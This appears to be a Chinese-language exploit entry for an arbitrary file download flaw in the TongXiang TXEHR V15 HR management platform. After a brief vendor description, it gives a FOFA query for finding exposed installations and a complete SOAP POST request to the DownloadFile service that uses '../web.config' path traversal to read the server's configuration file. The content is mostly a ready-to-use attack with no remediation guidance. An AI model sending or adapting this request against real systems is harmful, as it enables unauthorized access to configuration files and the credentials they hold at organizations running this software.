## **同享人力管理管理平台DownloadFile存在任意文件下载漏洞**

同享软件成立于1997年，运营中心位于东莞南城南新产业国际。专注研发和推广人力资源信息化产品，帮助企业构建统一的人力资源数智化平台，快速提高企业人才管理能力，提升人力资源管理效率，帮助员工快速成长，协助企业实现智慧决策。同享TXEHR V15人力管理管理平台DownloadFile存在任意文件下载漏洞

## fofa

```yaml
body="/Assistant/Default.aspx"
```

## poc

```yaml
POST /Service/DownloadTemplate.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: ASP.NET_SessionId=f40br0ilcoosnxgllqrmltkd
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/DownloadFile
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 310

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:DownloadFile>
         <!--type: string-->
         <tem:path>../web.config</tem:path>
      </tem:DownloadFile>
   </soapenv:Body>
</soapenv:Envelope>
```

![image-20240710184711192](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407101847260.png)